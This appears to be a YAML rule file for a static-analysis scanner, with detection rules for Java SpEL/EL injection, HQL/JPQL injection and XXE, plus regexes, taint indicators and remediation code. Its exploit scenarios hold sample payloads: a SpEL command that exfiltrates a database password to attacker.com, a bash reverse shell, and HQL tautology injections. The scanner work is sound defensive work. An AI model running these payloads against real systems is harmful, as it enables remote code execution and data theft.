- rule_id: JAVA-INJ-004
  title: Expression Language Injection (SpEL/EL)
  description: 'Detects Spring Expression Language (SpEL) or Jakarta Expression Language (EL) evaluation with user-controlled
    input. Covers SpelExpressionParser, StandardEvaluationContext, @Value annotations with tainted input, Thymeleaf expression
    injection, and JSP EL injection via dynamic attribute construction.

    '
  language: java
  category: injection
  severity: Critical
  confidence: 0.87
  cwe: CWE-917
  owasp: A03:2021-Injection
  tags:
  - expression-injection
  - spel
  - spring
  - rce
  - el-injection
  - thymeleaf
  patterns:
  - type: regex
    pattern: SpelExpressionParser\s*\(\s*\)\s*\.parseExpression\s*\(\s*(?:request|param|input|user|data)\b
    description: SpelExpressionParser.parseExpression with tainted input
  - type: regex
    pattern: (?:parser|expressionParser)\s*\.parseExpression\s*\(\s*(?:request|param|input|user|data|arg)\b
    description: Expression parser with tainted variable name
  - type: regex
    pattern: '@Value\s*\(\s*["'']#\{[^}]*(?:request|param|input|user)\b'
    description: '@Value annotation with tainted SpEL expression'
  - type: regex
    pattern: ExpressionParser\s*\w*\s*=\s*new\s+SpelExpressionParser[^;]*\.parseExpression\s*\(\s*\w*(?:input|param|user)
    description: SpelExpressionParser instantiation with tainted parse call
  - type: regex
    pattern: \.parseExpression\s*\(\s*(?:request|param|input|user|data|arg|body|payload|expr|expression)\b
    description: Generic parseExpression call with suspicious variable names
  - type: regex
    pattern: StandardEvaluationContext\s*\(\s*\)[\s\S]{0,200}\.parseExpression\s*\(\s*(?:request|param|input|user)
    description: StandardEvaluationContext followed by parseExpression with tainted input
  - type: regex
    pattern: Expression\s+\w+\s*=\s*\w+\.parseExpression\s*\(\s*(?:request|param|input|user|data)
    description: Expression variable assigned from parseExpression with tainted input
  - type: regex
    pattern: (?:expression|expr)\s*\.getValue\s*\(\s*(?:new\s+)?StandardEvaluationContext
    description: Expression.getValue with StandardEvaluationContext (unsafe context)
  - type: regex
    pattern: ExpressionFactory\s*\.newInstance\s*\(\s*\)[\s\S]{0,120}\.createValueExpression\s*\([^)]*(?:request|param|input|user)
    description: Jakarta EL ExpressionFactory with tainted value expression
  - type: regex
    pattern: Thymeleaf.*\$\{[^}]*(?:request|param|input|user)\b
    description: Thymeleaf template expression with tainted input
  - type: regex
    pattern: (?:model|modelMap|mav)\s*\.(?:addAttribute|put)\s*\(\s*[^,]+,\s*[^)]*\.parseExpression
    description: Parsed expression result added to Spring model
  - type: regex
    pattern: new\s+TemplateParserContext\s*\(\s*\)[\s\S]{0,150}\.parseExpression\s*\(\s*(?:request|param|input|user)
    description: TemplateParserContext with tainted input
  anti_patterns:
  - SimpleEvaluationContext
  - StandardEvaluationContext().setRootObject
  - allowlist
  - SimpleEvaluationContext.forReadOnlyDataBinding
  - SimpleEvaluationContext.forPropertyAccessors
  - DataBindingMethodResolver
  - ReflectiveMethodResolver
  - EXPRESSION_ALLOWLIST
  - ALLOWED_EXPRESSIONS
  - Pattern.matches
  - sanitizeExpression
  - validateExpression
  - SecurityExpressionHandler
  - PreInvocationAuthorizationAdvice
  - spring.security
  - hasRole
  - hasAuthority
  - isAuthenticated
  - static final String.*=.*#\{
  context_awareness:
    surrounding_context_patterns:
    - import org.springframework.expression
    - import org.springframework.expression.spel
    - import org.springframework.expression.spel.standard
    - import javax.el
    - import jakarta.el
    - import org.thymeleaf
    - SpelExpressionParser
    - ExpressionParser
    - StandardEvaluationContext
    - '@Controller'
    - '@RestController'
    taint_source_indicators:
    - request.getParameter
    - '@RequestParam'
    - '@PathVariable'
    - '@RequestBody'
    - '@RequestHeader'
    - HttpServletRequest
    - WebRequest
    - MultiValueMap
    - '@ModelAttribute'
    - BindingResult
    taint_sink_indicators:
    - ExpressionParser.parseExpression
    - SpelExpressionParser.parseExpression
    - Expression.getValue
    - Expression.setValue
    - ExpressionFactory.createValueExpression
    - ELProcessor.eval
    - ELProcessor.setValue
    - ELProcessor.getValue
    - TemplateEngine.process
    sanitization_patterns:
    - SimpleEvaluationContext
    - forReadOnlyDataBinding
    - DataBindingMethodResolver
    - allowList.contains
    - Pattern.matches
    - ALLOWED_EXPRESSIONS.contains
    - sanitizeExpression
  severity_scoring:
    severity_weight: 9
    risk_score_formula_hint: 'severity_weight * confidence * (1.0 - (uses_simple_context ? 0.7 : 0.0))'
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Spring MVC application provides a calculator feature at /api/calculate?expr= that evaluates user expressions
      using SpEL with StandardEvaluationContext. The developer intends simple math like "2 + 3" but an attacker submits: T(java.lang.Runtime).getRuntime().exec(''curl
      attacker.com/exfil?data=''+T(java.lang.System).getenv(''DB_PASSWORD'')) This SpEL expression accesses the Runtime class,
      executes an OS command, and exfiltrates the database password from the environment variables to the attacker''s server.

      '
    example_payload: T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/attacker.com/4444
      0>&1'})
    attacker_objective: Remote code execution within Spring application context, access to Spring beans, environment variables,
      file system, and connected databases
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: medium
  impact: 'SpEL injection allows arbitrary code execution within the Spring application

    context, enabling access to runtime objects, bean manipulation, file system

    access, and remote code execution.

    '
  remediation: "**Immediate Fix — Use SimpleEvaluationContext:**\n  // UNSAFE: StandardEvaluationContext allows full reflection\n\
    \  ExpressionParser parser = new SpelExpressionParser();\n  StandardEvaluationContext ctx = new StandardEvaluationContext();\n\
    \  Object result = parser.parseExpression(userInput).getValue(ctx);\n\n  // SAFE: SimpleEvaluationContext restricts to\
    \ data binding only\n  ExpressionParser parser = new SpelExpressionParser();\n  SimpleEvaluationContext ctx = SimpleEvaluationContext\n\
    \      .forReadOnlyDataBinding()\n      .build();\n  Object result = parser.parseExpression(userInput).getValue(ctx);\n\
    \n**Spring Boot — Avoid dynamic SpEL entirely:**\n  // Instead of evaluating user expressions, use typed DTOs:\n  @PostMapping(\"\
    /calculate\")\n  public CalculationResult calculate(@Valid @RequestBody CalculationRequest req) {\n      // Use safe arithmetic\
    \ operations on typed fields\n      return new CalculationResult(req.getOperandA() + req.getOperandB());\n  }\n\n**Jakarta\
    \ EE — Restrict EL evaluation:**\n  // Never use ELProcessor with untrusted input\n  // If you must evaluate expressions,\
    \ use allowlisting:\n  private static final Set<String> SAFE_EXPRESSIONS = Set.of(\"sum\", \"avg\", \"count\");\n  public\
    \ Object safeEval(String exprName, Map<String, Object> data) {\n      if (!SAFE_EXPRESSIONS.contains(exprName)) {\n  \
    \        throw new SecurityException(\"Expression not allowed\");\n      }\n      // Use predefined expression logic\n\
    \  }\n\n**Hibernate — SpEL in Spring Data JPA @Query:**\n  // Spring Data JPA @Query SpEL is restricted and generally\
    \ safe:\n  @Query(\"SELECT u FROM User u WHERE u.tenant = :#{#tenantId}\")\n  List<User> findByTenant(@Param(\"tenantId\"\
    ) String tenantId);\n  // But never construct @Query strings dynamically from user input\n\n**Thymeleaf (server-side template\
    \ injection):**\n  // UNSAFE: directly embedding user input in template expressions\n  model.addAttribute(\"greeting\"\
    , userInput); // if userInput = \"${T(java.lang.Runtime)...}\"\n  // SAFE: always use th:text (auto-escapes) not th:utext\n\
    \  // <span th:text=\"${greeting}\">Hello</span>\n\n**Additional hardening:**\n  - Audit all uses of ExpressionParser\
    \ and SpelExpressionParser in the codebase\n  - Use Spring Security's SpEL for authorization only (these are safe by design)\n\
    \  - Set up WAF rules to detect SpEL payloads (T(java.lang.*), Runtime, ProcessBuilder)\n"
  references:
  - https://cwe.mitre.org/data/definitions/917.html
  - https://docs.spring.io/spring-framework/reference/core/expressions.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Expression_Language_Injection_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: flow-aware
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - JAVA-INJ-002
    - JAVA-INJ-003
    - JAVA-SSTI-001
    - JAVA-DESER-001
  detection_layer: 1
- rule_id: JAVA-INJ-005
  title: HQL/JPQL Injection via String Concatenation
  description: 'Detects Hibernate HQL or JPA JPQL query construction via string concatenation with user-controlled input.
    Covers EntityManager.createQuery, Session.createQuery, createNativeQuery, dynamic Criteria API misuse, and Spring Data
    JPA @Query with SpEL or concatenation-based construction.

    '
  language: java
  category: injection
  severity: High
  confidence: 0.9
  cwe: CWE-89
  owasp: A03:2021-Injection
  tags:
  - hql-injection
  - jpql-injection
  - hibernate
  - jpa
  - orm-injection
  patterns:
  - type: regex
    pattern: (?:createQuery|createNativeQuery)\s*\(\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*(?:request|param|input|user)
    description: createQuery/createNativeQuery with concatenated tainted input
  - type: regex
    pattern: (?:entityManager|em|session)\s*\.(?:createQuery|createNativeQuery)\s*\(\s*\w*(?:hql|jpql|query|sql)\s*\+
    description: EntityManager/Session create query with variable concatenation
  - type: regex
    pattern: String\s+\w*(?:hql|jpql|query)\w*\s*=\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*\w+
    description: HQL/JPQL string variable built via concatenation
  - type: regex
    pattern: \.createQuery\s*\(\s*"FROM\s+\w+\s+WHERE\s+\w+\s*=\s*"\s*\+\s*\w+
    description: createQuery with FROM-WHERE pattern and concatenation
  - type: regex
    pattern: \.createQuery\s*\(\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*\w+\.get(?:Parameter|Header|Attribute)\s*\(
    description: createQuery with direct HttpServletRequest getter concatenation
  - type: regex
    pattern: (?:session|entityManager|em)\s*\.createSQLQuery\s*\(\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user)
    description: Hibernate deprecated createSQLQuery with tainted concatenation
  - type: regex
    pattern: StringBuilder\s+\w*(?:hql|jpql|query)\w*\s*=.*\.append\s*\(\s*(?:request|param|input|user|arg)
    description: StringBuilder-based HQL/JPQL with tainted append
  - type: regex
    pattern: String\.format\s*\(\s*['"](?:SELECT|FROM|UPDATE|DELETE)\b[^'"]*%s[^'"]*["']\s*,\s*(?:request|param|input|user)
    description: String.format used for HQL/JPQL construction with tainted input
  - type: regex
    pattern: (?:session|entityManager|em)\s*\.(?:createQuery|createNativeQuery)\s*\(\s*"[^"]*"\s*\+\s*\w+\s*\+\s*"[^"]*"
    description: Multi-part string concatenation in createQuery
  - type: regex
    pattern: \.createStoredProcedureQuery\s*\(\s*(?:request|param|input|user|data)\b
    description: createStoredProcedureQuery with tainted procedure name
  - type: regex
    pattern: Restrictions\.sqlRestriction\s*\(\s*[^)]*\+\s*(?:request|param|input|user)
    description: Hibernate Restrictions.sqlRestriction with tainted SQL fragment
  anti_patterns:
  - setParameter
  - setString
  - :param
  - ?1
  - CriteriaBuilder
  - CriteriaQuery
  - '@Query.*:param'
  - '@Query.*?1'
  - '@Query.*?2'
  - TypedQuery
  - NamedQuery
  - '@NamedQuery'
  - '@NamedNativeQuery'
  - createNamedQuery
  - JpaRepository
  - CrudRepository
  - JpaSpecificationExecutor
  - Specification
  - Predicate
  - cb.equal
  - cb.like
  - cb.and
  - cb.or
  - Root.get
  - QueryDSL
  - JPAQueryFactory
  - BooleanExpression
  - QEntity
  - mybatis
  - '#{param}'
  - SqlSessionFactory
  - spring.data.jpa
  - findBy
  - findAll
  - repository.save
  - Pageable
  - Sort
  - Example.of
  - ExampleMatcher
  context_awareness:
    surrounding_context_patterns:
    - import javax.persistence
    - import jakarta.persistence
    - import org.hibernate
    - import org.hibernate.query
    - import org.hibernate.Session
    - import javax.persistence.EntityManager
    - import jakarta.persistence.EntityManager
    - '@PersistenceContext'
    - '@Repository'
    - '@Transactional'
    - extends JpaRepository
    - implements CrudRepository
    taint_source_indicators:
    - request.getParameter
    - '@RequestParam'
    - '@PathVariable'
    - '@RequestBody'
    - '@ModelAttribute'
    - HttpServletRequest
    - BindingResult
    - WebRequest
    - SearchCriteria
    - FilterDTO
    - SortField
    taint_sink_indicators:
    - EntityManager.createQuery
    - EntityManager.createNativeQuery
    - Session.createQuery
    - Session.createSQLQuery
    - Session.createNativeQuery
    - EntityManager.createStoredProcedureQuery
    - Restrictions.sqlRestriction
    sanitization_patterns:
    - setParameter
    - setString
    - setInteger
    - setLong
    - :paramName
    - ?1
    - CriteriaBuilder
    - CriteriaQuery
    - Predicate
    - Specification
    - InputValidator
    - Pattern.matches
  severity_scoring:
    severity_weight: 8
    risk_score_formula_hint: severity_weight * confidence * (1.0 - orm_protection_coverage)
    exploitability_score: Medium
  exploit_scenario:
    attack_example: 'An enterprise HR application has a search endpoint /api/employees?dept= that builds a Hibernate HQL query
      via concatenation: session.createQuery("FROM Employee e WHERE e.department = ''" + dept + "''"). An attacker submits
      dept='' OR ''1''=''1 which modifies the HQL query to return all employees. Escalating further, the attacker uses HQL-specific
      features: dept='' OR 1=1 AND e.salary > 100000 ORDER BY e.ssn ASC -- which exfiltrates salary data and Social Security
      numbers sorted for convenient harvesting. While HQL is more restrictive than raw SQL, the attacker can still enumerate
      entity properties and extract sensitive data from any mapped entity attribute.

      '
    example_payload: ''' OR 1=1 AND e.role = ''ADMIN'' ORDER BY e.email ASC --'
    attacker_objective: Unauthorized data access via ORM query manipulation, bypassing business logic access controls, extracting
      sensitive entity attributes
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: medium
    sanitization_absence: high
  impact: 'HQL/JPQL injection can bypass ORM protections when queries are constructed

    via concatenation. While more limited than raw SQL injection, it still

    enables unauthorized data access and manipulation.

    '
  remediation: "**Immediate Fix — Use named or positional parameters:**\n  // UNSAFE:\n  session.createQuery(\"FROM User WHERE\
    \ name = '\" + input + \"'\");\n\n  // SAFE — named parameter:\n  Query<User> q = session.createQuery(\"FROM User u WHERE\
    \ u.name = :name\", User.class);\n  q.setParameter(\"name\", input);\n  List<User> results = q.getResultList();\n\n  //\
    \ SAFE — positional parameter:\n  TypedQuery<User> q = em.createQuery(\"SELECT u FROM User u WHERE u.name = ?1\", User.class);\n\
    \  q.setParameter(1, input);\n\n**Spring Boot / Spring Data JPA:**\n  // Use repository method naming convention (safest):\n\
    \  public interface UserRepository extends JpaRepository<User, Long> {\n      List<User> findByName(String name);\n  \
    \    List<User> findByDepartmentAndActiveTrue(String department);\n  }\n\n  // Or use @Query with named parameters:\n\
    \  @Query(\"SELECT u FROM User u WHERE u.name = :name AND u.dept = :dept\")\n  List<User> searchUsers(@Param(\"name\"\
    ) String name, @Param(\"dept\") String dept);\n\n  // Or use Specifications for dynamic queries:\n  public class UserSpecifications\
    \ {\n      public static Specification<User> hasName(String name) {\n          return (root, query, cb) -> cb.equal(root.get(\"\
    name\"), name);\n      }\n  }\n\n**Jakarta EE / JPA Criteria API:**\n  CriteriaBuilder cb = em.getCriteriaBuilder();\n\
    \  CriteriaQuery<User> cq = cb.createQuery(User.class);\n  Root<User> root = cq.from(User.class);\n  List<Predicate> predicates\
    \ = new ArrayList<>();\n  if (nameFilter != null) {\n      predicates.add(cb.equal(root.get(\"name\"), nameFilter));\n\
    \  }\n  cq.where(predicates.toArray(new Predicate[0]));\n  List<User> results = em.createQuery(cq).getResultList();\n\n\
    **Hibernate — Criteria API (legacy):**\n  Criteria criteria = session.createCriteria(User.class);\n  criteria.add(Restrictions.eq(\"\
    name\", input));\n  List<User> results = criteria.list();\n  // Note: Hibernate Criteria API is deprecated; prefer JPA\
    \ CriteriaBuilder\n\n**MyBatis — Use #{} (never ${}):**\n  <!-- SAFE: parameterized binding -->\n  <select id=\"findByName\"\
    \ resultType=\"User\">\n    SELECT * FROM users WHERE name = #{name}\n  </select>\n\n  <!-- UNSAFE: raw string interpolation\
    \ -->\n  <select id=\"findByName\" resultType=\"User\">\n    SELECT * FROM users WHERE name = '${name}'\n  </select>\n\
    \n**QueryDSL (type-safe alternative):**\n  QUser user = QUser.user;\n  List<User> results = queryFactory.selectFrom(user)\n\
    \      .where(user.name.eq(input))\n      .fetch();\n\n**Additional hardening:**\n  - Enable Hibernate SQL logging in\
    \ development to review generated queries\n  - Use static analysis tools (SpotBugs, Find Security Bugs) to detect concatenation\
    \ patterns\n  - Enforce code review policies for any direct createQuery/createNativeQuery usage\n  - Consider using Spring\
    \ Data Specifications for all dynamic query requirements\n"
  references:
  - https://cwe.mitre.org/data/definitions/89.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
  - https://docs.jboss.org/hibernate/orm/current/userguide/html_single/Hibernate_User_Guide.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: stable
    detection_complexity: contextual
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: false
    high_impact_flag: true
    related_rules:
    - JAVA-INJ-001
    - JAVA-INJ-004
    - JAVA-AUTH-001
    - JAVA-MASS-ASSIGN-001
  detection_layer: 1
- rule_id: JAVA-INJ-006
  title: XML External Entity (XXE) Injection
  description: 'Detects XML parsing with external entity processing enabled via DocumentBuilderFactory, SAXParserFactory,
    XMLInputFactory, or TransformerFactory without proper feature disabling.

    '
  language: java
  category: injection
  severity: High
  confidence: 0.92
  cwe: CWE-611
  owasp: A05:2021-Security-Misconfiguration
  tags:
  - xxe
  - xml-injection
  - file-disclosure
  - ssrf
  - java
  detection_layer: 1
  attack_surface_type: api
  patterns:
  - type: regex
    pattern: DocumentBuilderFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,300}(?:setFeature|FEATURE_SECURE_PROCESSING))
    description: DocumentBuilderFactory without secure features
  - type: regex
    pattern: SAXParserFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,300}(?:setFeature|FEATURE_SECURE_PROCESSING))
    description: SAXParserFactory without secure features
  - type: regex
    pattern: XMLInputFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,200}(?:SUPPORT_DTD|IS_SUPPORTING_EXTERNAL_ENTITIES))
    description: XMLInputFactory without DTD/external entity disabled
  - type: regex
    pattern: TransformerFactory\.newInstance\s*\(\s*\)(?![\s\S]{0,200}(?:ACCESS_EXTERNAL|FEATURE_SECURE))
    description: TransformerFactory without access restrictions
  - type: regex
    pattern: new\s+XMLReader\s*\(\s*\)(?![\s\S]{0,200}setFeature)
    description: XMLReader without feature configuration
  anti_patterns:
  - FEATURE_SECURE_PROCESSING
  - disallow-doctype-decl
  - external-general-entities.*false
  - external-parameter-entities.*false
  - SUPPORT_DTD.*false
  - IS_SUPPORTING_EXTERNAL_ENTITIES.*false
  - ACCESS_EXTERNAL_DTD
  - ACCESS_EXTERNAL_STYLESHEET
  - setExpandEntityReferences(false)
  bypass_variants:
  - description: XXE via XSLT stylesheet
    pattern: TransformerFactory.*newTemplates\s*\(\s*new\s+StreamSource
  - description: XXE via XInclude
    pattern: setXIncludeAware\s*\(\s*true\s*\)
  evasion_indicators:
  - Parameter entity injection
  - XInclude-based XXE
  - XSLT-based XXE
  encoding_variants:
  - type: utf7
    pattern: \\+ADw-\\+ACE-DOCTYPE
  - type: utf16
    pattern: \\xff\\xfe.*DOCTYPE
  multi_function_chain_patterns:
  - request.getInputStream() -> DocumentBuilder.parse(inputStream)
  - request.getReader() -> SAXParser.parse(reader)
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: File disclosure and SSRF via external entities
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: request.getInputStream(), @RequestBody
    sink: DocumentBuilder.parse(), SAXParser.parse()
    through: XML parsing with default entity resolution
  impact: 'XXE enables reading local files, SSRF to internal services, denial of

    service via billion laughs, and port scanning of internal networks.

    '
  remediation: "Disable external entities in DocumentBuilderFactory:\n  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n\
    \  dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n  dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\"\
    , false);\n  dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n  dbf.setXIncludeAware(false);\n\
    \  dbf.setExpandEntityReferences(false);\n"
  references:
  - https://cwe.mitre.org/data/definitions/611.html
  - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
  context_awareness:
    surrounding_context_patterns:
    - import javax.xml.parsers
    - import org.xml.sax
    - import javax.xml.stream
